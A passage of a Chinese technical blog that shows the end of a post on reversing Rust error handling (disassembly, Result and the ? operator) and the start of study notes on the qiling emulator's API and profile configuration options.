8B 54 24 18                mov     rdx, [rsp+258h+var_240]</span><br><span class="line">.text:000000000000ACD9 48 8B 74 24 20                mov     rsi, [rsp+258h+var_238]</span><br><span class="line">.text:000000000000ACDE 48 8D 05 7B 71 01 00          lea     rax, _ZN47_$LT$std__fs__File$u20$as$u20$std__io__Read$GT$4read17hae1516f05988cce4E ; _$LT$std..fs..File$u20$as$u20$std..io..Read$GT$::read::hae1516f05988cce4</span><br><span class="line">.text:000000000000ACE5 48 8D 7C 24 44                lea     rdi, [rsp+258h+var_214]</span><br><span class="line">.text:000000000000ACEA FF D0                         call    rax ; _$LT$std..fs..File$u20$as$u20$std..io..Read$GT$::read::hae1516f05988cce4 ; _$LT$std..fs..File$u20$as$u20$std..io..Read$GT$::read::hae1516f05988cce4</span><br><span class="line">.text:000000000000ACEA</span><br><span class="line">.text:000000000000ACEC 48 89 54 24 08                mov     [rsp+258h+var_250], rdx</span><br><span class="line">.text:000000000000ACF1 48 89 44 24 10                mov     [rsp+258h+var_248], rax</span><br><span class="line">.text:000000000000ACF6 EB 00                         jmp     short $+2</span><br></pre></td></tr></table></figure>
<p>下面的if判断则是针对<code>read</code>函数返回值<code>Result</code>，条件成立代表错误。</p>
<h1 id="reverse-for-operator"><a class="markdownIt-Anchor" href="#reverse-for-operator"></a> Reverse for Operator <code>?</code></h1>
<p>在Rust中，<code>?</code>运算符能够简化错误传递的流程，使得源代码更加简练和优雅。理论上，<code>?</code>只起到了简化源代码书写的作用，下面进行验证。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> std::io::Read;</span><br><span class="line"><span class="keyword">use</span> std::fs::File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">read_username_from_file</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>, io::Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">f</span> = File::<span class="title function_ invoke__">open</span>(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">f</span> = <span class="keyword">match</span> f &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(file) =&gt; file,</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(e),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> f.<span class="title function_ invoke__">read_to_string</span>(&amp;<span class="keyword">mut</span> s) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(_) =&gt; <span class="title function_ invoke__">Ok</span>(s),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="title function_ invoke__">Err</span>(e),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">match</span> <span class="title function_ invoke__">read_username_from_file</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(s) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> std::io::Read;</span><br><span class="line"><span class="keyword">use</span> std::fs::File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">read_username_from_file</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>, io::Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">f</span> = File::<span class="title function_ invoke__">open</span>(<span class="string">&quot;hello.txt&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    f.<span class="title function_ invoke__">read_to_string</span>(&amp;<span class="keyword">mut</span> s)?;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">match</span> <span class="title function_ invoke__">read_username_from_file</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(s) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面两段代码的功能是完全相同的，只是后面一个使用了<code>?</code>运算符。</p>
<p><img src="4.png" alt="" /></p>
<p><img src="5.png" alt="" /></p>
<p>上面是两段代码<code>read_username_from_file</code>的反汇编界面。对于不使用<code>?</code>运算符的源代码，其内容比较好理解。而<code>?</code>运算符实际上是利用了<code>Result</code>实现了<code>std::ops::Try</code>这个Trait的特点：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[unstable(feature = <span class="string">&quot;try_trait_v2&quot;</span>, issue = <span class="string">&quot;84277&quot;</span>)]</span></span><br><span class="line"><span class="keyword">impl</span>&lt;T, E&gt; ops::Try <span class="keyword">for</span> <span class="title class_">Result</span>&lt;T, E&gt; &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Output</span> = T;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Residual</span> = <span class="type">Result</span>&lt;convert::Infallible, E&gt;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from_output</span>(output: <span class="keyword">Self</span>::Output) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(output)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">branch</span>(<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> ControlFlow&lt;<span class="keyword">Self</span>::Residual, <span class="keyword">Self</span>::Output&gt; &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(v) =&gt; ControlFlow::<span class="title function_ invoke__">Continue</span>(v),</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(e) =&gt; ControlFlow::<span class="title function_ invoke__">Break</span>(<span class="title function_ invoke__">Err</span>(e)),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在第22行，Rust调用了<code>_&lt;core::result::Result&lt;T, E&gt; as core::ops::try_trait::Try&gt;::branch</code>，从上面的实现源码可以看到<code>branch</code>通过<code>match</code>控制执行流。又因为如果结果为<code>Ok</code>时返回的是<code>Self::Residual</code>实例，后续要使用<code>Result</code>真正包装的实例还需要调用反汇编窗口26行的<code>_&lt;core::result::Result&lt;T, F&gt; as core::ops::try_trait::FromResidual&lt;core..result..Result&lt;core::convert::Infallible, E&gt;&gt;&gt;::from_residual</code>获取。这部分内容可以参考<a target="_blank" rel="noopener" href="https://rustmagazine.github.io/rust_magazine_2021/chapter_4/try_trait_v2.html">资料</a>中有关于<code>try_trait</code>的解释。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文简单分析了<code>panic!</code>以及<code>Result</code>。</p>
<ul>
<li><code>panic!</code>内部使用了x86的stack unwinding技术，可完成堆栈的回溯。另外通过<code>.debug_line</code>节可定位具体的行数。</li>
<li><code>Result&lt;T, E&gt;</code>索引值为0表示<code>Ok</code>，1则表示<code>Err</code>。</li>
<li><code>?</code>标识符由于使用了<code>std::ops::Try</code> Trait的函数，因此只能用于实现了这个Trait的结构，<code>Result</code>就是其一，还有<code>Option&lt;T&gt;</code>也实现了该Trait。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/08/02/qiling-%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/02/qiling-%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">qiling 学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-08-02 15:23:52" itemprop="dateCreated datePublished" datetime="2024-08-02T15:23:52+08:00">2024-08-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-08-06 15:31:07" itemprop="dateModified" datetime="2024-08-06T15:31:07+08:00">2024-08-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>qiling 是一个基于 Unicorn 开发的二进制文件仿真工具，与 Unicorn 不同，qiling 的功能更加完善更加易用。下面将对该 Python 库的主要 API 进行总结与学习。</p>
<h1 id="a-类-qiling"><a class="markdownIt-Anchor" href="#a-类-qiling"></a> A. 类 <code>Qiling</code></h1>
<p>这是 qiling 模拟器主类，将完成仿真的大部分主要操作。</p>
<h2 id="a1-构造方法"><a class="markdownIt-Anchor" href="#a1-构造方法"></a> A.1 构造方法</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        argv: <span class="type">Sequence</span>[<span class="built_in">str</span>] = [],</span></span><br><span class="line"><span class="params">        rootfs: <span class="built_in">str</span> = <span class="string">r&#x27;.&#x27;</span>,</span></span><br><span class="line"><span class="params">        env: MutableMapping[AnyStr, AnyStr] = &#123;&#125;,</span></span><br><span class="line"><span class="params">        code: <span class="type">Optional</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        ostype: <span class="type">Optional</span>[QL_OS] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        archtype: <span class="type">Optional</span>[QL_ARCH] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        verbose: QL_VERBOSE = QL_VERBOSE.DEFAULT,</span></span><br><span class="line"><span class="params">        profile: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, Mapping]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        console: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">        log_file: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        log_override: <span class="type">Optional</span>[<span class="string">&#x27;Logger&#x27;</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        log_plain: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        multithread: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        <span class="built_in">filter</span>: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        stop: QL_STOP = QL_STOP.NONE,</span></span><br><span class="line"><span class="params">        *,</span></span><br><span class="line"><span class="params">        endian: <span class="type">Optional</span>[QL_ENDIAN] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        thumb: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        libcache: <span class="built_in">bool</span> = <span class="literal">False</span></span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>一些常用参数的含义：</p>
<ul>
<li><code>argv</code>：命令的具体内容，对于控制台的命令，需要以空格分开并保存在列表中。如要执行<code>/bin/cat flag.txt</code>则需要传入<code>['/bin/cat', 'flag.txt']</code>。</li>
<li><code>rootfs</code>：本次模拟的根目录，默认为当前目录。</li>
<li><code>env</code>：环境变量，传入字典即可。</li>
<li><code>code</code>：自定义代码，不能和<code>argv</code>同时指定，这个参数主要是用于执行机器码字节序列。</li>
<li><code>ostype</code>：操作系统，传入<code>QL_OS</code>类型。</li>
<li><code>archtype</code>：处理器架构，传入<code>QL_ARCH</code>类型。</li>
<li><code>verbose</code>：输出信息的详细程度，如调试级别会比默认级别输出更多信息。传入<code>QL_VERBOSE</code>类型。</li>
<li><code>profile</code>：配置项，可以保存在文件中传入文件名，也可以传入字典。</li>
<li><code>console</code>：是否运行在终端，将输出内容显示在终端。</li>
<li><code>log_file</code>：日志的输出文件。</li>
<li><code>log_plain</code>：是否输出去除颜色的日志内容，当日志被保存到文件中时常用。</li>
<li><code>multithread</code>：是否使用多线程。</li>
<li><code>filter</code>：根据正则表达式筛选指定日志输出。</li>
<li><code>endian</code>：端序。</li>
<li><code>thumb</code>：模拟 ARM 架构时是否为 thumb 模式。</li>
</ul>
<p>这里与程序运行过程中关系最大的参数之一就是<code>profile</code>，我们可以在这里定义堆栈的地址、mmap的输出地址、网络配置等，<code>profile</code>参数如果为文件名，后缀应为<code>.ql</code>，文件实际格式为<code>yaml</code>。下面是默认的 Linux 配置文件：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">CODE</span>]</span><br><span class="line"><span class="comment"># ram_size 0xa00000 is 10MB</span></span><br><span class="line"><span class="string">ram_size</span> <span class="string">=</span> <span class="number">0xa00000</span></span><br><span class="line"><span class="string">entry_point</span> <span class="string">=</span> <span class="number">0x1000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">OS64</span>]</span><br><span class="line"><span class="string">stack_address</span> <span class="string">=</span> <span class="number">0x7ffffffd0000</span></span><br><span class="line"><span class="string">stack_size</span> <span class="string">=</span> <span class="number">0x30000</span></span><br><span class="line"><span class="string">load_address</span> <span class="string">=</span> <span class="number">0x555555554000</span></span><br><span class="line"><span class="string">interp_address</span> <span class="string">=</span> <span class="number">0x7ffff7dd5000</span></span><br><span class="line"><span class="string">mmap_address</span> <span class="string">=</span> <span class="number">0x7fffb7dd6000</span></span><br><span class="line"><span class="string">vsyscall_address</span> <span class="string">=</span> <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">OS32</span>]</span><br><span class="line"><span class="string">stack_address</span> <span class="string">=</span> <span class="number">0x7ff0d000</span></span><br><span class="line"><span class="string">stack_size</span> <span class="string">=</span> <span class="number">0x30000</span></span><br><span class="line"><span class="string">load_address</span> <span class="string">=</span> <span class="number">0x56555000</span></span><br><span class="line"><span class="string">interp_address</span> <span class="string">=</span> <span class="number">0x047ba000</span></span><br><span class="line"><span class="string">mmap_address</span> <span class="string">=</span> <span class="number">0x90000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">KERNEL</span>]</span><br><span class="line"><span class="string">uid</span> <span class="string">=</span> <span class="number">1000</span></span><br><span class="line"><span class="string">gid</span> <span class="string">=</span> <span class="number">1000</span></span><br><span class="line"><span class="string">pid</span> <span class="string">=</span> <span class="number">1996</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">MISC</span>]</span><br><span class="line"><span class="string">current_path</span> <span class="string">=</span> <span class="string">/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">NETWORK</span>]</span><br><span class="line"><span class="comment"># override the ifr_name field in ifreq structures to match the hosts network interface name.</span></span><br><span class="line"><span class="comment"># that fixes certain socket ioctl errors where the requested interface name does not match the</span></span><br><span class="line"><span class="comment"># one on the host. comment out to avoid override</span></span><br><span class="line"><span class="string">ifrname_override</span> <span class="string">=</span> <span class="string">eth0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To use IPv6 or not, to avoid binary double bind. ipv6 and ipv4 bind the same port at the same time</span></span><br><span class="line"><span class="string">bindtolocalhost</span> <span class="string">=</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># Bind to localhost</span></span><br><span class="line"><span class="string">ipv6</span> <span class="string">=</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>非常令人不解的是，官方文档并没有详细给出 profile 配置文件中包含哪些有效的项。翻遍了整个互联网，居然没有人对 qiling 配置文件的所有选项进行总结，要想知道某个配置的名字，只能参考现有的 .ql 文件，外加直接搜索 qiling 源代码中的相关用法。加载中需要使用的项在仓库的<code>loader</code>目录下不同格式的二进制文件加载过程代码中可以找到，下面简单总结一下查到的所有配置文件项列表（可能不全）：</p>
<h2 id="a2-profile-配置文件项"><a class="markdownIt-Anchor" href="#a2-profile-配置文件项"></a> A.2. profile 配置文件项</h2>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">所有格式通用：（os/os.py、os/posix/posix.py）</span><br><span class="line">[CODE]（Qiling构造函数需传入code参数）</span><br><span class="line">    entry_point: 程序入口点</span><br><span class="line">    ram_size: RAM的大小</span><br><span class="line">[MISC]</span><br><span class="line">    current_path: 当前路径（OS类型需要为支持POSIX的，包括Linux、FreeBSD、QNX、macOS、Windows、DOS）</span><br><span class="line">[KERNEL]</span><br><span class="line">    uid: uid号和euid号</span><br><span class="line">    gid: gid号和egid号</span><br><span class="line">    pid: pid号</span><br><span class="line">[NETWORK]</span><br><span class="line">    ipv6: 布尔值，是否支持ipv6</span><br><span class="line">    bindtolocalhost: 布尔值，是否绑定到本机IP</span><br><span class="line">    ifrname_override: 主机网络设备映射</span><br><span class="line"></span><br><span class="line">BLOB：（无操作系统的Bare Metal二进制文件）</span><br><span class="line">[CODE]</span><br><span class="line">    heap_size: 堆空间大小</span><br><span class="line"></span><br><span class="line">DOS：</span><br><span class="line">[COM]</span><br><span class="line">    start_cs: 初始CS值（要求后缀名为.DOS_COM）</span><br><span class="line">    start_ip: 初始IP值（要求后缀名为.DOS_COM）</span><br><span class="line">    start_sp: 初始SP值（要求后缀名为.DOS_COM）</span><br><span class="line">    stack_size: 栈大小</span><br><span class="line">[KERNEL]</span><br><span class="line">    ticks_per_second: 时钟频率</span><br><span class="line"></span><br><span class="line">ELF:</span><br><span class="line">[OS&#123;字长bit数&#125;]</span><br><span class="line">    stack_address: 栈地址</span><br><span class="line">    stack_size: 栈大小</span><br><span class="line">    load_address: 加载地址（需要为重定向文件）</span><br><span class="line">    interp_address: Linux加载器地址</span><br><span class="line">    mmap_address: mmap返回的地址</span><br><span class="line">    vsyscall_address: vsyscall地址（需要为OS64）</span><br><span class="line"></span><br><span class="line">MacOS:</span><br><span class="line">[OS64]</span><br><span class="line">    stack_address: 栈地址</span><br><span class="line">    stack_size: 栈大小</span><br><span class="line">    vmmap_trap_address: vmmap内存映射地址</span><br><span class="line">    heap_address: 堆地址</span><br><span class="line">    heap_size: 堆大小</span><br><span class="line">    mmap_address: mmap返回的地址</span><br><span class="line">[LOADER]</span><br><span class="line">    slide</span><br><span class="line">    dyld_slide</span><br><span class="line">    </span><br><span class="line">MCU:</span><br><span class="line">    无</span><br><span class="line"></span><br><span class="line">PE:</span><br><span class="line">[HARDWARE]</span><br><span class="line">    number_processors: 处理器数量</span><br><span class="line">[SYSTEM]</span><br><span class="line">    productType: 产品类型</span><br><span class="line">    majorVersion: 大版本号</span><br><span class="line">    minorVersion: 小版本号</span><br><span class="line">    VER_SERVICEPACKMAJOR: 系统包大版本</span><br><span class="line">    language: 系统语言（调用Windows SDK API）</span><br><span class="line">    permission: 权限</span><br><span class="line">[OS&#123;字长bit数&#125;]</span><br><span class="line">    KI_USER_SHARED_DATA：内核用户共享数据地址</span><br><span class="line">    stack_address: 栈地址</span><br><span class="line">    stack_size: 栈大小</span><br><span class="line">    image_address: 程序的加载地址</span><br><span class="line">    dll_address: 系统等DLL文件加载地址</span><br><span class="line">    entry_point: 程序入口</span><br><span class="line">[VOLUME]</span><br><span class="line">    name: 卷名</span><br><span class="line">    serial_number: 卷序列号</span><br><span class="line">    type: 卷类型</span><br><span class="line">    sectors_per_cluster: 每个簇的分区数量</span><br><span class="line">    bytes_per_sector: 每个分区包含的字节数量</span><br><span class="line">    number_of_free_clusters: 可用簇数量</span><br><span class="line">    number_of_clusters: 簇总数</span><br><span class="line">[PATH]</span><br><span class="line">    systemdrive: 系统驱动</span><br><span class="line">    ???: 其他任意Windows环境变量</span><br><span class="line">[USER]</span><br><span class="line">    language: 用户语言（Windows SDK API）</span><br><span class="line">[NETWORK]</span><br><span class="line">    dns_response_ip: DNS服务器IP</span><br><span class="line">[PROCESSES]</span><br><span class="line">    csrss.exe: csrss.exe的pid</span><br><span class="line">[KERNEL]</span><br><span class="line">    parent_pid: 父进程pid</span><br><span class="line">[REGISTRY]</span><br><span class="line">    ???: 任意注册表项</span><br><span class="line"></span><br><span class="line">PE_UEFI:</span><br><span class="line">[DXE]</span><br><span class="line">    heap_address: 堆地址</span><br><span class="line">    heap_size: 堆大小</span><br><span class="line">    stack_address: 栈地址</span><br><span class="line">    stack_size: 栈大小</span><br><span class="line">    image_address: EFI文件的加载地址</span><br><span class="line">[SMM]</span><br><span class="line">    smram_size: SMM执行模式下的SMRAM大小</span><br><span class="line">    smram_base: SMM执行模式下的SMRAM基址</span><br><span class="line">    heap_address: SMM堆地址</span><br><span class="line">    heap_size: SMM堆大小</span><br><span class="line">    image_address: SMM加载基地址</span><br><span class="line">[LOADED_IMAGE_PROTOCOL]</span><br><span class="line">    Guid: 加载的image的guid</span><br><span class="line">[HOB_LIST]</span><br><span class="line">    Guid: Hand-Off Block，用于数据交接块的guid</span><br></pre></td></tr></table></figure>
<p>下面，我们尝试模拟一下 Linux 系统的 ASLR 保护机制加载一个 ELF 文件，并在 main 函数开头暂停，输出该 ELF 文件的内存布局情况。</p>
<h2 id="a3-第一次试运行"><a class="markdownIt-Anchor" href="#a3-第一次试运行"></a> A.3 第一次试运行</h2>
<p>在第一次运行的过程中，发现了一些问题，下面逐一进行解决。</p>
<p>测试代码：</p>
